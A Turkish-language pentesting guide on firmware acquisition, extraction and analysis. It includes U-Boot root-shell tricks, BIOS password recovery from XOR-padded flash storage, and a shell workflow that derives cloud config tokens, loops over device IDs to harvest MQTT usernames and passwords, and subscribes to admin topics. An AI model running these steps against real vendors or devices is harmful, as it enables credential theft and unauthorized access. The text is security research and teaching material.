# Firmware Analizi

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Giriş**

### İlgili kaynaklar

Açıkta bulunan donanım arayüzlerinden edinim için [UART konsolu yardımıyla firmware dökümü alma](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) ve [SPI flash dökümü alma](../hardware-hacking/spi.md#dumping-firmware-from-eeproms) konularına bakın. Konsola erişmeden önce tekrarlanabilir bir önyükleme zamanı UART yakalaması için [SCPI kontrollü güç ve osiloskopla edinim](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi) konusuna bakın.

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware, donanım bileşenleri ile kullanıcıların etkileşimde bulunduğu yazılım arasındaki iletişimi yönetip kolaylaştırarak cihazların doğru çalışmasını sağlayan temel yazılımdır. Kalıcı bellekte saklanır; böylece cihaz, açıldığı andan itibaren gerekli talimatlara erişebilir ve işletim sistemini başlatabilir. Güvenlik açıklarını belirlemede firmware'i incelemek ve gerektiğinde değiştirmek kritik bir adımdır.<sup>[[2]](#references)[[3]](#references)</sup>

## **Bilgi Toplama**

**Bilgi toplama**, bir cihazın yapısını ve kullandığı teknolojileri anlamak için kritik bir ilk adımdır. Bu süreç şu konularda veri toplamayı içerir:

- CPU mimarisi ve çalıştırdığı işletim sistemi
- Bootloader ayrıntıları
- Donanım yerleşimi ve veri sayfaları
- Kod tabanı ölçümleri ve kaynak konumları
- Harici kütüphaneler ve lisans türleri
- Güncelleme geçmişi ve mevzuat sertifikaları
- Mimari ve akış diyagramları
- Güvenlik değerlendirmeleri ve belirlenen güvenlik açıkları

Bu amaçla **open-source intelligence (OSINT)** araçları çok değerlidir. Mevcut open-source yazılım bileşenlerini manuel ve otomatik inceleme süreçleriyle analiz etmek de aynı ölçüde önemlidir. [Coverity Scan](https://scan.coverity.com) ve [Semmle’s LGTM](https://lgtm.com/#explore) gibi araçlar, olası sorunları bulmak için kullanılabilecek ücretsiz statik analiz olanağı sunar.

## **Firmware Edinme**

Firmware'i edinmenin farklı yolları vardır ve her birinin karmaşıklık düzeyi farklıdır:

- Kaynaktan (**geliştiricilerden veya üreticilerden**) **doğrudan** edinme
- Sağlanan talimatları izleyerek **derleme**
- Resmî destek sitelerinden **indirme**
- Barındırılan firmware dosyalarını bulmak için **Google dork** sorgularından yararlanma
- [S3Scanner](https://github.com/sa7mon/S3Scanner) gibi araçlarla **cloud storage** alanlarına doğrudan erişme
- **Man-in-the-middle** teknikleriyle **güncellemeleri** yakalama
- **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash) veya **PICit** gibi bağlantılar üzerinden cihazdan **çıkarma**
- Cihaz iletişimi sırasında güncelleme isteklerini **dinleme**
- **Hardcoded güncelleme endpoint'lerini** belirleme ve kullanma
- Bootloader'dan veya ağ üzerinden **döküm alma**
- Diğer tüm yöntemler başarısız olduğunda uygun donanım araçlarını kullanarak depolama çipini **çıkarma ve okuma**

### Yalnızca UART günlükleri: flash'teki U-Boot env üzerinden root shell'i zorlama

UART RX yok sayılıyorsa (yalnızca günlükler alınıyorsa), **U-Boot ortam bloğunu** çevrimdışı düzenleyerek yine de bir init shell'i zorlayabilirsiniz:<sup>[[6]](#references)</sup>

1. SOIC-8 klipsi ve programlayıcıyla (3.3V) SPI flash dökümü alın:
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env bölümünü bulun, `bootargs` değerini `init=/bin/sh` içerecek şekilde düzenleyin ve blob için **U-Boot env CRC32 değerini yeniden hesaplayın**.
3. Yalnızca env bölümünü yeniden flash’leyin ve yeniden başlatın; UART üzerinde bir shell açılmalıdır.

Bu yöntem, bootloader shell’inin devre dışı bırakıldığı ancak env bölümüne harici flash erişimiyle yazılabilen gömülü cihazlarda kullanışlıdır.

### Firewall kopyalama göreviyle korumalı kodu açığa çıkarma

Bazı MCU’lar, korumasız uygulama kodunun korumalı Flash’ı doğrudan okuması yerine korumalı bölgeye açılan bir ağ geçidini çağırmasına izin verir. Uygulama kodu çalıştırma yetkisi elde ettikten sonra her ağ geçidi görevini ayrı bir bellek aktarım primitive’i olarak inceleyin. Cypherock X1 örneğinde STM32L4 Firewall çağrı geçidi; bir görev, harici bir `data` işaretçisi, bir uzunluk ve korumalı bir `address` kabul ediyordu. Bir yazma görevi, Firewall Code içindeki bir `data` kaynak işaretçisini reddedemiyordu. Çağıran taraf bu kodu doğrudan okuyamıyordu, ancak ağ geçidi kodu korumalı kalıcı olmayan depolamaya kopyalayabiliyor ve izin verilen bir okuma görevi de bu depolamayı açığa çıkarıyordu.<sup>[[15]](#references)</sup>

Bu tür bir açığa çıkarmayı yeniden oluşturmak için, karşılık gelen bir okuma görevi bulunan yazılabilir bir korumalı depolama sayfası belirleyin, yazma kaynağını art arda gelen korumalı kod adreslerine ayarlayın ve ara belleğe alınan baytları okuyun. Yazma işlemlerini tekrarlamadan önce depolama ortamını kontrol edin: bu örnekte ortam Flash’tı, bu nedenle sayfanın yeniden kullanılmadan önce silinmesi gerekiyordu. Araştırmacılar, geçerli Secure Data Storage içeriğini silip geri yükleyen bir yordam kullandı; ardından cüzdan verilerinin üzerine yazmak yerine kodu kalan boş alana yerleştirdi. Bunun için MCU üzerinde kod çalıştırma yetkisi ve erişilebilir bir çağrı geçidi gerekir; kimliği doğrulanmamış bir ana bilgisayardan doğrudan okuma atlatması değildir.<sup>[[15]](#references)</sup>

Kurtarılan kod, [firmware güncelleme ve önyükleme bütünlüğündeki güven açıklarını](firmware-integrity.md#fragmented-update-state-and-writable-integrity-metadata) ortaya çıkarabilir.<sup>[[15]](#references)</sup>

## Firmware’i analiz etme

Artık **firmware’e sahipsiniz**; nasıl ele almanız gerektiğini anlamak için firmware hakkında bilgi çıkarmanız gerekiyor. Bunun için kullanabileceğiniz farklı araçlar:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Bu araçlarla fazla bir şey bulamazsan, `binwalk -E <bin>` ile imajın **entropisini** kontrol et. Entropi düşükse imajın şifrelenmiş olma ihtimali düşüktür. Entropi yüksekse büyük olasılıkla şifrelenmiştir (veya bir şekilde sıkıştırılmıştır).

Ayrıca **firmware içine gömülü dosyaları** çıkarmak için şu araçları kullanabilirsin:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Dosyayı incelemek için [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) da kullanılabilir.

### Harici flash bellekteki ham ekran varlıkları

Harici bir SPI dump'ı, MCU'nun çalıştırılabilir firmware'i olmak zorunda değildir. Cortex-M hedefinde, olası her kod bölgesinin başlangıcını aygıtın bellek haritasıyla karşılaştır: normal bir vektör tablosu, makul bir SRAM yığın işaretçisi ve çalıştırılabilir bellekte bulunan bir reset-handler adresiyle başlar. Sıfır offset'inde vektör tablosunun bulunmaması, tek başına tüm yongada kod olmadığını kanıtlamaz; diğer offset'leri ve boot düzenini de incele. `binwalk` herhangi bir kapsayıcı bulamazsa ham baytları incele ve [decoded SPI capture](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) içindeki flash okuma adreslerini yeni ekranları yükleyen işlemlerle ilişkilendir.<sup>[[14]](#references)</sup>

Ekran varlıklarının bulunduğu bir bölge için PNG/JPEG olduğunu varsaymak yerine olası piksel biçimlerini ve boyutlarını dene. Kaynakta belirtilen aygıtta **80×160 RGB565 little-endian** kareler kullanılıyordu: piksel başına iki bayt olduğundan bir kare **25,600 bayttır** (25 KiB), 24 kilobit değil. Kodlanmış bir flash okuma adresi, ekran varlığının offset'ini belirledi; araştırmacı `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb` komutuyla hazırlanmış bir görseli dönüştürdü, özgün dump'taki aynı boyutlu varlığı değiştirdi, `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` komutuyla yazdı ve yeni görselin ekranda görüntülendiğini doğruladı. Bu, MCU'nun dahili firmware'inin çıkarılmasını veya yeniden flash'lanmasını değil, yazılabilir *harici ekran varlıklarını* gösterir. Herhangi bir yazma işlemi yapmadan önce özgün dump'ı sakla ve boyutları, bayt sırasını, offset'i ve değiştirilen verinin uzunluğunu doğrula.<sup>[[14]](#references)</sup>

### Diferansiyel flash analizi ve kurtarılabilir XOR gizli veri depoları

Bir firmware ayarının belgelenmiş bir depolama biçimi yoksa, önce eşleşen birkaç flash okuması al, **tam olarak bir** ayarı değiştir, ardından tüm yongayı yeniden dump'la ve offset'leri karşılaştır. Deneyi kontrollü değerlerle tekrarlamak, ayara ait değişiklikleri sayaçlardan ve yazma meta verilerinden ayırt etmeye yardımcı olur; verilerin yerinde değiştirilmek yerine yeni offset'lerde değişmesi, yalnızca ekleme yapan veya log yapısında bir depolamaya işaret eder. Silinmiş/işaretlenmiş girdileri sakla; yük verileri kurtarılabilir durumda kalabilir.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

After locating the region, extract the firmware modules with tools such as `binwalk` and reverse the writer/validator in Ghidra. Kodda alan sınırlarını, padding'i, key indexing'i ve key derivation'ı doğrulayın; şemayı yalnızca ciphertext örüntülerinden çıkarsamayın.<sup>[[12]](#references)</sup>

#### Şifrelenmiş sıfır padding'den key'leri kurtarma

[XOR-based encryption](../../crypto/symmetric/#xor-based-encryption) bölümünde açıklandığı gibi, bilinen plaintext aynı offset'lerdeki keystream byte'larını ortaya çıkarır. Sabit boyutlu bir alan, sıfır padding'i tekrarlanan bir XOR key'inin tüm indekslerini kapsadığında özellikle savunmasızdır: `0x00 XOR key_byte = key_byte` olduğundan, şifrelenmiş padding bu key byte'larını doğrudan açığa çıkarır. Tüm key indeksleri kapsanıyorsa, ciphertext'in son kısmından key'i yeniden oluşturun ve dolu byte'ların şifresini çözün.<sup>[[12]](#references)</sup>

Dell'in savunmasız DVAR BIOS-password formatı somut bir örnektir: 32 byte'lık bir alanın `0` numaralı byte'ı plaintext'tir; `1..31` byte'ları ise tekrarlanan 20 byte'lık bir key kullanır.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Parola uzunluğu `L` için, XOR işleminden önce `L..31` konumları sıfırdı. `L <= 12` olduğunda bu konumlar tüm anahtar indekslerini kapsar; böylece brute force yapmadan anahtarın ve parolanın tamamı kurtarılır:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Geçmiş kayıtlardan anahtarları çıkarma

Her kaydı bağımsız olarak analiz etmeyin. DVAR anahtarı yaklaşık olarak `modified_md5(device_seed || variable_GUID || password[0])` şeklinde türetilir: cihaz tohumu ve GUID sabittir; parolaya bağlı tek girdi, açık metin hâlindeki ilk bayttır. Bu, cihaz başına en fazla 256 anahtar olduğu ve aynı baytla başlayan kayıtların aynı anahtarı paylaştığı anlamına gelir. Etkin ve silinmiş kayıtları bu bayta göre gruplayın; kısa bir geçmiş kaydın dolgusu tam anahtarı açığa çıkarabilir ve dolgusu yetersiz olan güncel, daha uzun bir kaydın şifresini çözebilir. Eski şifreli metin silinmek yerine tombstone ile işaretlendiğinde, parola rotasyonu bu nedenle maruziyeti artırabilir.<sup>[[12]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn) aracı DVAR'ı bulur, aday kayıtları doğrular, parolaları kurtarır ve depolanmış ham/anahtar baytlarını görüntüleyebilir. Aracı bir checkout'tan derleyin ve doğrulanmış bir flash imajını aşağıdaki gibi tarayın:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Özel ayrıştırıcılarda yanlış pozitifleri kayıt yapısı, yazdırılabilir karakter kısıtlamaları, sıfır dolgusu kontrolleri, anahtar entropisi ve anahtarın döngü yaptığı yerlerdeki tutarlılıkla eleyin. Tekrarlanan dökümlerde yazma başına seyrek bit değişimleri görülüyorsa gözlemlenen maskeleri listeleyin ve bu kısıtlamalara göre düzeltmeleri sıralayın; ancak sezgisel çıktıyı kesin kurtarma sonucu olarak sunmak yerine belirsiz karakterleri bildirin.<sup>[[12]](#references)</sup>

Parola doğrulayıcıları, geri döndürülebilir ciphertext yerine salt eklenmiş, yinelemeli tek yönlü bir hash saklamalıdır. Günlük yapılı depolarda ise artık kullanılmayan gizli materyal güvenli şekilde silinmelidir.<sup>[[12]](#references)</sup>

### Dosya Sistemini Edinme

Önceki yorumlanmış `binwalk -ev <bin>` gibi araçlarla **dosya sistemini çıkarmış** olmanız gerekirdi.\
Binwalk genellikle dosya sistemini, dosya sistemi türünün adıyla anılan bir **klasöre** çıkarır. Bu türler genellikle şunlardan biridir: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Dosya Sistemini Elle Çıkarma

Bazen binwalk, imzalarında dosya sisteminin **magic byte** değerini bulundurmaz. Bu durumlarda binwalk'i kullanarak dosya sisteminin **ofsetini bulun ve sıkıştırılmış dosya sistemini** ikili dosyadan **ayırın**; ardından aşağıdaki adımları izleyerek dosya sistemini türüne göre **elle çıkarın**.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Squashfs dosya sistemini carve etmek için aşağıdaki **dd komutunu** çalıştırın.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatif olarak aşağıdaki komut da çalıştırılabilir.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs için (yukarıdaki örnekte kullanılmıştır)

`$ unsquashfs dir.squashfs`

Dosyalar daha sonra "`squashfs-root`" dizininde bulunur.

- CPIO arşiv dosyaları için

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 dosya sistemleri için

`$ jefferson rootfsfile.jffs2`

- NAND flash içeren ubifs dosya sistemleri için

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Bölünmüş embedded root dosya sistemlerini yeniden oluşturma

Ham bir eMMC/SSD dökümü geçerli bir dosya sistemi başlığı içeriyor ancak metadata offset'leri nominal partition sınırlarını aşıyorsa, bunu hemen bozuk olarak sınıflandırmayın. Embedded boot kodu, Device Mapper ile birden fazla fiziksel aralıktan gerçek root cihazını oluşturabilir; bu nedenle tek bir GPT partition'ı carving etmek yalnızca ilk segmenti verir.<sup>[[9]](#references)</sup>

#### Tam medya imajını ön değerlendirmeden geçirin

Önce edinim işleminin tamamlandığını, boyutun sabit olduğunu ve hiçbir yazma işleminin imajı hâlâ kullanmadığını doğrulayın. Dosya adı başlangıç/bitiş adresi içeriyorsa, bu aralığı gerçek bayt sayısıyla karşılaştırın. GPT'yi salt okunur modda kurtarın ve yalnızca gerekli aralığı bağlayın; iş istasyonunda güvenilmeyen bir fiziksel volume üzerinde `vgchange -ay` çalıştırmayın; çünkü volume group çakışmaları ve istenmeyen yazmalar meydana gelebilir.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Özgün init mantığının veya bir LVM yığınının imajın tamamını görmesi gerekiyorsa tek kullanımlık bir VM tercih edin. Standart bir önyükleme bölümündeki geçmiş önyükleme günlükleri özellikle faydalıdır: bootloader; tescilli kapsayıcı ofsetlerini, bileşen uzunluklarını, slot seçimini, hizalama kurallarını ve imza doğrulamasını günlüğe kaydetmiş olabilir. Gömülü komut satırını/kernel/initramfs’i bu değerleri kullanarak ayıklayın, ardından her çıktıyı `file`, magic byte’lar ve `binwalk` ile bağımsız olarak doğrulayın; kapsayıcının sonuna kadar okumak yanlışlıkla bir initrd’yi, ACPI nesnesini veya imzayı kernel’e ekleyebilir.<sup>[[9]](#references)</sup>

#### Önyükleme sırasındaki blok eşlemesini kurtarma

Kernel’in initramfs’ini çıkarın ve `/init` dosyasını ve varsa depolama kitaplıklarını tersine mühendislikle inceleyin. [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) bölümünde `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` ve bölüm yollarına yönelik dize referanslarını izleyin; ardından etkin A/B slotunu seçen ve tabloyu oluşturan kodu takip edin. radare2 için yararlı başlangıç noktaları: `r2 -A init`, `afl`, `pdf @ main` ve `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

linear hedefi, sanal bir aygıtın ardışık aralıklarını bir veya daha fazla arka uç aygıtındaki aralıklara eşler. Kurtarılan iki segmentli bir tablo genellikle şu biçimdedir (tüm konumlar ve uzunluklar 512 baytlık sektörler cinsindendir):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Makine kodundaki aritmetiği tamsayı genişliği, kaydırmalar ve birim dönüşümleri de dahil olmak üzere aynen yeniden üretin. Örneğin, aşağıdaki ifade bir bayt boyutunu önce 4 KiB sınırına yuvarlar, ancak bundan sonra 512 baytlık sektörlere dönüştürür; bunu `p4_bytes // 512` ile değiştirmek, bölüm sayfa hizalı olmadığında seçilen son kısmı `p4_bytes % 4096` kadar kaydırır.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Tablodaki sıraya göre aralıkları, medya dökümünün tamamını belleğe yüklemek yerine boyutu sınırlandırılmış parçalar halinde kopyalayarak düz bir analiz imajı oluşturun. Bu yöntem, ana makine tarafında mapper aygıtları oluşturulmasını da önler. GPT'den türetilen ofsetleri, ters çevrilmiş sektör sayılarını ve ortaya çıkan çıktı uzunluğunu ayrı ayrı doğrulayın.<sup>[[9]](#references)</sup>

#### Bozulmayı sabit bir yeniden oluşturma hatasından ayırt etme

SquashFS için `unsquashfs` çalıştırmadan önce `hsqs` magic değerini kontrol edin ve superblock'taki 40. ofsette bulunan little-endian 64-bit `bytes_used` alanının kodunu çözün. Birbirinden bağımsız birkaç yapıda çıkarma işlemi başarısız olursa beklenen konumların çevresinde geniş bir arama penceresi tarayın ve güçlü yapısal adaylar arayın: sıkıştırması açılabilen bir metadata bloğu, art arda gelen birkaç geçerli dizin girdisi, makul inode alanları, inode sayısıyla tutarlı bir root inode veya geçerli bir integrity-metadata yapısı. Tek bir magic eşleşmesi yeterli değildir.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Aynı işaretli delta bağımsız yapıları (örneğin dizin metadata'sını ve bir verity kaydını) geçerli kılıyorsa, olası neden eksik baytlar değil, sistematik bir segment başlangıcı hatasıdır. Orphan kurtarmayı veya dosya sistemi metadata'sını yamalamayı denemeden önce tersine çevrilmiş aritmetiğe dönün ve atılan kalanları, signedness'ı, taşmayı ya da sektör/sayfa yuvarlamasını araştırın.<sup>[[9]](#references)</sup>

Son olarak, koruma sınırlarını ayrı tutun: TPM ile mühürlenmiş LUKS birimleri veri gizliliğini korurken, imzalı bir dm-verity eşlemesi kök dosya sistemi bütünlüğünü korur. Bir yazılım TPM'i, orijinal fiziksel TPM'e mühürlenmiş bir anahtarı kurtaramaz; verity doğrulamasını atlayan, yalnızca araştırma amaçlı bir init üzerinden değiştirilmiş bir SquashFS'i başlatmak da imzasını taklit etmez veya dm-verity'yi kırmaz.<sup>[[9]](#references)</sup>

## Firmware'ı Analiz Etme

Firmware elde edildikten sonra yapısını ve olası güvenlik açıklarını anlamak için onu incelemek önemlidir. Bu süreç, firmware imajını analiz etmek ve içinden değerli verileri çıkarmak için çeşitli araçların kullanılmasını içerir.

### İlk Analiz Araçları

İkili dosyanın ( `<bin>` olarak anılır) ilk incelemesi için bir dizi komut verilmiştir. Bu komutlar dosya türlerini belirlemeye, dizeleri çıkarmaya, ikili verileri analiz etmeye ve bölüm ve dosya sistemi ayrıntılarını anlamaya yardımcı olur:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Görüntünün şifreleme durumunu değerlendirmek için `binwalk -E <bin>` komutuyla **entropi** kontrol edilir. Düşük entropi, şifreleme olmadığını düşündürürken yüksek entropi olası şifreleme veya sıkıştırmaya işaret eder.

**Gömülü dosyaları** çıkarmak için **file-data-carving-recovery-tools** belgeleri ve dosyaları incelemeye yönelik **binvis.io** gibi araç ve kaynaklar önerilir.

### Dosya Sistemini Çıkarma

`binwalk -ev <bin>` komutuyla genellikle dosya sistemi çıkarılabilir; çoğu zaman dosya sisteminin türünü taşıyan bir dizine (ör. squashfs, ubifs) çıkarılır. Ancak **binwalk**, magic byte'ların eksik olması nedeniyle dosya sistemi türünü tanıyamadığında elle çıkarma gerekir. Bunun için `binwalk` ile dosya sisteminin konumu bulunur, ardından dosya sistemini ayıklamak için `dd` komutu kullanılır:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Daha sonra, dosya sistemi türüne (ör. squashfs, cpio, jffs2, ubifs) bağlı olarak içerikleri manuel olarak çıkarmak için farklı komutlar kullanılır.

### Dosya Sistemi Analizi

Dosya sistemi çıkarıldıktan sonra güvenlik açıkları aranmaya başlanır. Güvenli olmayan ağ daemon’larına, hardcoded kimlik bilgilerine, API endpoint’lerine, update server işlevlerine, derlenmemiş koda, başlangıç betiklerine ve çevrimdışı analiz için derlenmiş ikili dosyalara dikkat edilir.

İncelenecek **önemli konumlar** ve **öğeler** şunlardır:

- Kullanıcı kimlik bilgileri için **etc/shadow** ve **etc/passwd**
- **etc/ssl** içindeki SSL sertifikaları ve anahtarları
- Olası güvenlik açıkları için yapılandırma ve betik dosyaları
- İleri analiz için gömülü ikili dosyalar
- Yaygın IoT cihazı web sunucuları ve ikili dosyaları

Dosya sistemindeki hassas bilgileri ve güvenlik açıklarını bulmaya şu araçlar yardımcı olur:

- Hassas bilgi araması için [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) ve [**Firmwalker**](https://github.com/craigz28/firmwalker)
- Kapsamlı firmware analizi için [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- Statik ve dinamik analiz için [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) ve [**EMBA**](https://github.com/e-m-b-a/emba)

### Derlenmiş İkili Dosyalarda Güvenlik Kontrolleri

Dosya sisteminde bulunan hem kaynak kod hem de derlenmiş ikili dosyalar güvenlik açıkları açısından incelenmelidir. Unix ikili dosyaları için **checksec.sh**, Windows ikili dosyaları içinse **PESecurity** gibi araçlar, istismar edilebilecek korumasız ikili dosyaları belirlemeye yardımcı olur.

## Türetilmiş URL token’ları aracılığıyla cloud config ve MQTT kimlik bilgilerini elde etme

Birçok IoT hub, cihaza özgü yapılandırmasını şu biçimdeki bir cloud endpoint’inden alır:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analizi sırasında `<token>` değerinin, örneğin hardcoded bir secret kullanılarak device ID’den yerel olarak türetildiğini görebilirsiniz:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Bu tasarım, deviceId’yi ve STATIC_KEY’i öğrenen herkesin URL’yi yeniden oluşturup cloud config’i çekmesine olanak tanır; bu işlem genellikle plaintext MQTT kimlik bilgilerini ve topic öneklerini açığa çıkarır.

Uygulamalı iş akışı:

1) UART boot log’larından deviceId’yi çıkarın

- 3.3V UART adaptörü (TX/RX/GND) bağlayıp log’ları yakalayın:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Bulut yapılandırma URL kalıbını ve broker adresini yazdıran satırları arayın, örneğin:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Firmware'den STATIC_KEY ve token algoritmasını kurtarma

- Binary'leri Ghidra/radare2'ye yükleyin ve config path ("/pf/") ya da MD5 kullanımını arayın.
- Algoritmayı doğrulayın (örn. MD5(deviceId||STATIC_KEY)).
- Token'ı Bash'te türetin ve digest'i büyük harfe dönüştürün:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Bulut yapılandırmasını ve MQTT kimlik bilgilerini topla

- URL'yi oluşturup curl ile JSON'ı çek; sırları ayıklamak için jq kullan:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Düz metin MQTT'yi ve zayıf topic ACL'lerini (varsa) kötüye kullanın

- Bakım topic'lerine abone olmak ve hassas olayları aramak için kurtarılan kimlik bilgilerini kullanın:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Tahmin edilebilir cihaz kimliklerini listeleyin (ölçekli olarak, yetkilendirme kapsamında)

- Birçok ekosistem, satıcı OUI/ürün/tür baytlarının ardından sıralı bir sonek kullanır.
- Aday kimlikleri yineleyebilir, token'ları türetebilir ve yapılandırmaları programatik olarak alabilirsiniz:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notlar
- Toplu enumeration yapmaya çalışmadan önce daima açık yetkilendirme alın.
- Mümkün olduğunda hedef donanımı değiştirmeden sırları elde etmek için emülasyonu veya statik analizi tercih edin.

Firmware emülasyonu süreci, bir cihazın çalışmasının veya tek bir programın **dinamik analizini** sağlar. Bu yaklaşım, donanım veya mimari bağımlılıkları nedeniyle zorluklarla karşılaşabilir; ancak root filesystem'ı veya belirli binary dosyalarını Raspberry Pi gibi mimarisi ve endianness değeri eşleşen bir cihaza ya da önceden oluşturulmuş bir sanal makineye aktarmak, daha ileri testleri kolaylaştırabilir.

### Tekil Binary Dosyalarını Emüle Etme

Tek programları incelerken programın endianness değerini ve CPU mimarisini belirlemek çok önemlidir.

#### MIPS Mimarisi Örneği

MIPS mimarisindeki bir binary dosyasını emüle etmek için şu komut kullanılabilir:

```bash
file ./squashfs-root/bin/busybox
```

Gerekli emülasyon araçlarını yüklemek için:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS (big-endian) için `qemu-mips` kullanılır; little-endian binary'ler içinse `qemu-mipsel` tercih edilir.

#### ARM Architecture Emulation

ARM binary'leri için süreç benzerdir; emülasyonda `qemu-arm` emülatörü kullanılır.

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) ve diğerleri gibi araçlar, tüm firmware'in emülasyonunu kolaylaştırır, süreci otomatikleştirir ve dinamik analize yardımcı olur.

### Emülasyon için bölünmüş ve doğrulanmış root dosya sistemlerini yeniden oluşturma

